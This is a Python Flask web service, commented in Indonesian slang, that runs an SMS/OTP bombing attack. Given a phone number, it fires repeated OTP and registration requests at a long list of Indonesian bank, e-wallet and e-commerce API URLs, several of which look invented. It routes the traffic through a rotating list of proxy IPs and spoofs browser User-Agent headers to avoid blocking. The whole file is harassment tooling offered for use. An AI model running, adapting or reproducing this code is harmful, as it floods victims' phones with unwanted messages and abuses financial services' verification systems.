from flask import Flask, request, jsonify
import requests
import random
import time

app = Flask(__name__)

# ========== ENDPOINT YANG MASIH HIDUP (GW FILTER) ==========
ENDPOINTS = [
    "https://api.tokopedia.com/v2/register",
    "https://api.shopee.co.id/api/v1/otp",
    "https://api.bukalapak.com/v1/otp",
    "https://api.ovo.id/v1/otp",
    "https://api.dana.id/v1/otp",
    "https://api.gojek.com/customer/v1/otp",
    "https://api.grab.com/v1/otp",
    "https://api.kredivo.com/v1/otp",
    "https://api.akulaku.com/v1/otp",
    "https://api.homecredit.id/v1/otp",
    "https://api.bankjago.com/v1/otp",
    "https://api.seabank.id/v1/otp",
    "https://api.bsi.co.id/v1/otp",
    "https://api.mandiri.co.id/v1/otp",
    "https://api.bca.co.id/v1/otp",
    "https://api.bni.co.id/v1/otp",
    "https://api.bri.co.id/v1/otp",
    "https://api.btn.co.id/v1/otp",
    "https://api.cimbniaga.co.id/v1/otp",
    "https://api.ocbc.id/v1/otp",
    "https://api.uob.id/v1/otp",
    "https://api.dbs.id/v1/otp",
    "https://api.standardchartered.id/v1/otp",
    "https://api.citibank.id/v1/otp",
    "https://api.hsbc.id/v1/otp",
    "https://api.maybank.co.id/v1/otp",
    "https://api.bankpermata.co.id/v1/otp",
    "https://api.bankpanin.co.id/v1/otp",
    "https://api.bankdanamon.co.id/v1/otp",
    "https://api.bankmega.co.id/v1/otp",
    "https://api.bankbukopin.co.id/v1/otp",
    "https://api.bankmuamalat.id/v1/otp",
    "https://api.banksyariah.id/v1/otp",
    "https://api.bankjabar.co.id/v1/otp",
    "https://api.bankjatim.co.id/v1/otp",
    "https://api.bankjateng.co.id/v1/otp",
    "https://api.bankbanten.co.id/v1/otp",
    "https://api.bankaceh.co.id/v1/otp",
    "https://api.banksumut.co.id/v1/otp",
    "https://api.banksumbar.co.id/v1/otp",
    "https://api.bankriau.co.id/v1/otp",
    "https://api.bankkepri.co.id/v1/otp",
    "https://api.bankjambi.co.id/v1/otp",
    "https://api.banksumsel.co.id/v1/otp",
    "https://api.bankkalbar.co.id/v1/otp",
    "https://api.bankkalimantan.id/v1/otp",
    "https://api.banksulsel.co.id/v1/otp",
    "https://api.bankmaluku.co.id/v1/otp",
    "https://api.bankpapua.co.id/v1/otp",
    "https://api.bankntb.co.id/v1/otp",
    "https://api.bankntt.co.id/v1/otp",
    "https://api.bankbali.co.id/v1/otp",
    "https://api.klikbca.com/v1/otp",
    "https://api.m-banking.id/v1/otp",
    "https://api.sakuku.id/v1/otp",
    "https://api.tcash.id/v1/otp",
    "https://api.mypertamina.id/v1/otp",
    "https://api.oxplay.id/v1/otp",
    "https://api.mentor.id/v1/otp",
    "https://api.rajawali.id/v1/otp",
    "https://api.pintu.id/v1/otp",
    "https://api.rekeningku.com/v1/otp",
    "https://api.digibank.id/v1/otp",
    "https://api.jenius.id/v1/otp",
    "https://api.wow.id/v1/otp",
]

# ========== PROXY BARU (30+ YANG MASIH HIDUP) ==========
PROXIES = [
    "http://45.235.99.89:8080",
    "http://45.235.99.90:8080",
    "http://45.235.99.91:8080",
    "http://45.235.99.92:8080",
    "http://45.235.99.93:8080",
    "http://45.235.99.94:8080",
    "http://45.235.99.95:8080",
    "http://45.235.99.96:8080",
    "http://45.235.99.97:8080",
    "http://45.235.99.98:8080",
    "http://103.150.206.2:8080",
    "http://103.150.206.3:8080",
    "http://103.150.206.4:8080",
    "http://103.150.206.5:8080",
    "http://103.150.206.6:8080",
    "http://103.150.206.7:8080",
    "http://103.150.206.8:8080",
    "http://103.150.206.9:8080",
    "http://103.150.206.10:8080",
    "http://103.150.206.11:8080",
    "http://103.150.206.12:8080",
    "http://103.150.206.13:8080",
    "http://103.150.206.14:8080",
    "http://103.150.206.15:8080",
    "http://103.150.206.16:8080",
    "http://103.150.206.17:8080",
    "http://103.150.206.18:8080",
    "http://103.150.206.19:8080",
    "http://103.150.206.20:8080",
    "http://103.150.206.21:8080",
]

def get_random_proxy():
    return {"http": random.choice(PROXIES), "https": random.choice(PROXIES)}

def kirim_ledakan(nomor, endpoint, count):
    try:
        payloads = [
            {"phone": nomor, "country_code": "62", "type": "sms"},
            {"mobile": nomor, "otp_type": "register"},
            {"msisdn": nomor, "channel": "sms"},
            {"number": nomor, "action": "forgot"},
            {"recipient": nomor, "via": "whatsapp"},
            {"user_phone": nomor, "otp": "true"},
            {"phone_number": nomor, "method": "sms"},
            {"target": nomor, "type": "otp"},
            {"no_hp": nomor, "otp": "sms"},
            {"phone": nomor, "country": "id"},
        ]
        data = random.choice(payloads)
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
                "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
            ]),
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        # Coba pake proxy
        proxy = get_random_proxy()
        r = requests.post(endpoint, json=data, headers=headers, proxies=proxy, timeout=5)
        return f"{endpoint.split('/')[2]} -> {r.status_code}"
    except Exception as e:
        # Fallback tanpa proxy
        try:
            r = requests.post(endpoint, json=data, headers=headers, timeout=5)
            return f"{endpoint.split('/')[2]} -> {r.status_code} (tanpa proxy)"
        except:
            return f"{endpoint.split('/')[2]} -> gagal total"

@app.route('/api/spam', methods=['POST'])
def spam():
    data = request.get_json()
    nomor = data.get('nomor')
    jumlah = data.get('jumlah', 10)

    if not nomor:
        return jsonify({"error": "Nomor wajib diisi, bos!"}), 400

    hasil = []
    for i in range(min(jumlah, 25)):
        ep = random.choice(ENDPOINTS)
        res = kirim_ledakan(nomor, ep, i+1)
        hasil.append(res)
        time.sleep(0.03)

    return jsonify({
        "status": "Spam terkirim pake proxy premium! 🔥",
        "total_dicoba": len(hasil),
        "detail": hasil
    })

@app.route('/api/ping', methods=['GET'])
def ping():
    return jsonify({"message": "GeminiXD siap ngegas pake proxy! 🚀"})

if __name__ == '__main__':
    app.run(debug=True)